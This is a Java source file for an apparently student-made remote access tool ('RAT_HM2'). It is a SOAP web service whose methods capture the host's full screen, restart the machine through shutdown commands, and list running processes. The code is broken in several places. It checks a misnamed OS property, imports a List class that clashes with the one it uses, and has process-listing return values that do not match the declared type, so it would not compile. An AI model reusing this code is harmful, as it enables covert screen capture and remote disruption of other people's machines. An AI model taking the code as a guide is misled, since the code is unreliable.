package RAT_HM2.provider;
import javax.jws.WebService;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.*;
import java.lang.*;
import java.time.format.DateTimeFormatter;  
import java.time.LocalDateTime;
import java.io.*;
import java.util.*;
import java.awt.List;
@WebService
public class RemoteAccess{
   
   
    public byte[] GetCapture(){
        try{
            Rectangle RecScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage REcCapture = new Robot().createScreenCapture(RecScreen );
        
            ByteArrayOutputStream Recbaos = new ByteArrayOutputStream();
            ImageIO.write(REcCapture ,"png", Recbaos );
            byte[] bytes = Recbaos.toByteArray(); 
            return bytes;
            }catch(Exception e){
                    return null;
            }
    }

    public boolean restart(){
        try{
            Runtime r = Runtime.getRuntime();
            String ops= System.getProperty("ops.name").toLowerCase();
            if(ops.contains("windows")){
             //the code shutdown -r -t, to restart the computer after 5 seconds.
               r.exec("shutdown -r -t 5"); 
            }else if(ops.contains("linux") || ops.contains("mac os x")){
                r.exec("shutdown -r 5"); 
            }
           // if we not use the time, then by default, the computer will get shutdown/restart after 30 seconds using shutdown -s or shutdown -r.
            return true;
        } catch(Exception e){
            return false;
        }
    }



    //check
    public String[] getRunningProcess(){
        try{
            List<String> processList = new ArrayList<>();

            ProcessBuilder pb = new ProcessBuilder("tasklist");
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                processList.add(line);
            }
            
            return System.getProperty("processList");
        
    } catch(Exception e){
    return false;
}
 
}
}